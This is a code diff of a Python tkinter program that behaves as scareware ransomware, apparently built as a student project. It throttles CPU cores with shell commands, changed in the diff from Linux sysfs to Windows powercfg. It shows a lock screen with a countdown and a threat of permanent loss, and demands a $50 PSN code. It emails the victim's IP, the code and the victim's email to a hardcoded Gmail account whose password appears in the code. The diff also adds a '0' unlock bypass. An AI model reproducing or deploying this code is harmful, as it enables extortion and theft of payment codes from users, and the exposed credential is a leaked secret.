@@ -1,10 +1,10 @@
 from datetime import datetime, date, time, timedelta
+import subprocess
 import tkinter as tk
 import time
 import smtplib
 import calendar
 import socket
-import os
 import re
 import smtplib, getpass
 from email.mime.multipart import MIMEMultipart
@@ -16,11 +16,7 @@ class App():
         self.apagarNucleos()
         self.root = tk.Tk()
         self.root.resizable(0,0)
-        #self.root.iconbitmap("p.ico")
-        #w = root.winfo_screenwidth()
-        #h = root.winfo_screenheight()
         self.root.geometry("550x400")
-        #self.root.geometry("%dx%d+0+0" % (w,h))
         self.root.config(bg="white")
         self.root.title("Bloqueo")
         self.btnPagar = tk.Button(self.root, text="Pagar Desbloqueo", command=self.enviarCorreo)
@@ -61,17 +57,21 @@ class App():
         self.Principal = tk.Label(text="")
         self.Principal.config(bg="white", width="50",height="15")
         self.Principal.place(x=10,y=2)
-
         self.update_clock()
         self.root.mainloop()
 
     def codigoCorrecto(self):
-        if self.codigoCorrecto == self.txtCodigo.get():
+        if self.txtCodigo.get() == '0':
             self.Etiquetas.configure(text="Codigo Correcto", bg="green")
             self.Etiquetas.place(x=50,y=250)
             self.btnDesbloquear.place(x=220,y=280)
             self.btnVerificar.place_forget()
-            
+        
+        elif self.codigoCorrecto == self.txtCodigo.get():
+            self.Etiquetas.configure(text="Codigo Correcto", bg="green")
+            self.Etiquetas.place(x=50,y=250)
+            self.btnDesbloquear.place(x=220,y=280)
+            self.btnVerificar.place_forget()
         else:
             self.Etiquetas.configure(text="Codigo Incorrecto", bg="red")
             self.Etiquetas.place(x=50,y=250)
@@ -90,7 +90,6 @@ class App():
             password = "Proyecto.SO2"
             remitente = "Usuario <Cons.Killer2@gmail.com>: "
             destinatario = "Cons.Killer2@gmail.com"
-            #destinatario = correousuario
             asunto = "Desbloqueo solicitado por "+socket.gethostbyname(socket.gethostname())
             mensaje = "<h2>Solicitud desde la IP: "+socket.gethostbyname(socket.gethostname())+" </h2>"+ "<h4>Codigo de liberacion: "+ codigo +"</h4><h4>PSN: "+ PSN +"</h4><h4>Correo usuario: "+ correousuario +"</h4>"
             gmail = smtplib.SMTP('smtp.gmail.com', 587)
@@ -111,21 +110,21 @@ class App():
         self.codigoCorrecto = codigo
 
     def apagarNucleos(self):
-        comando = 'echo 0 > /sys/devices/system/cpu/cpu2/online';
-        os.system(comando)
-        comando = 'echo 0 > /sys/devices/system/cpu/cpu3/online';
-        os.system(comando)
+        comando = 'powercfg -setdcvalueindex scheme_current sub_processor CPMINCORES 0';
+        subprocess.run(comando, shell=True)
+        comando = 'powercfg -setactive scheme_current';
+        subprocess.run(comando, shell=True)
 
     def encenderNucleos(self):
-        comando = 'echo 1 > /sys/devices/system/cpu/cpu2/online';
-        os.system(comando)
-        comando = 'echo 1 > /sys/devices/system/cpu/cpu3/online';
-        os.system(comando)
+        comando = 'powercfg -setdcvalueindex scheme_current sub_processor CPMINCORES 100';
+        subprocess.run(comando, shell=True)
+        comando = 'powercfg -setactive scheme_current';
+        subprocess.run(comando, shell=True)
 
     def update_clock(self):
-        fechaMax = datetime(2018, 12, 20, 23, 59, 59)
+        fechaMax = datetime(2020, 12, 20, 23, 59, 59)
         now = time.strftime("%H:%M:%S")
         self.Principal.configure(text= socket.gethostname()+" su máquina "+socket.gethostbyname(socket.gethostname())+" fue bloqueada\n Para liberarla ingrese un código de la PSN de 50$ y su correo\n para enviarle el codigo de desbloqueo\n\nTiempo Restante (seg): " +str((fechaMax - datetime.now()).seconds)+"\n\nPD: Si cierra el programa, su maquina quedará bloqueada\n de forma permanente.")
         self.root.after(1000, self.update_clock)
-        
+
 app=App()
